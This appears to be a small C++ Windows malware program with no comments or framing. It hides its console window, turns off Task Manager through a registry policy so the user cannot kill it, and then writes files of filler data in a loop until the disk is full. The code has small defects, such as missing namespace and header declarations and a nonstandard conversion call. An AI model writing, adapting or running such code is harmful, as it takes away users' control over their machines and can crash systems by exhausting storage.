#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#include <windows.h>
#include <fstream>
#include <cstdlib>
#include <cstring>


int main()
{
  DWORD dwVal = 1;

  HKEY hKey;
  RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
  RegSetValueEx (hKey, "DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal , sizeof(DWORD));
  RegCloseKey(hKey);
  
  ofstream output;
	int i = 0;
	int j = 0;
	char name[256];
	char number[256];
	
	const unsigned int size = 999999;
	char filler[size];
	for (int r = 0; r < size; r++)
		filler[r] = 'a';
	
	
	while (j < 100)
	{
		strcpy(name, "test/");
		strcat(name, itoa(j, number, 16));
		strcat(name, "_");
		strcat(name, itoa(i, number,16));
		strcat(name, ".txt");
	
		output.open(name);
		if (!output.good())
		{
			cout << "Disk Full When Opened\n";
			return 0;
		}
		for (int r = 0; r < 100; r++)
		{	
			output.write(filler, size);	
			if (!output.good())
			{
				cout << "Disk Full While Writing\n";
				output.close();
				return 0;
			}	
		}
		output.close();
		
		i++;
		if (i > 100)
		{
			j++;
			i = 0;		
		}	
	}
  return 0;
  
}
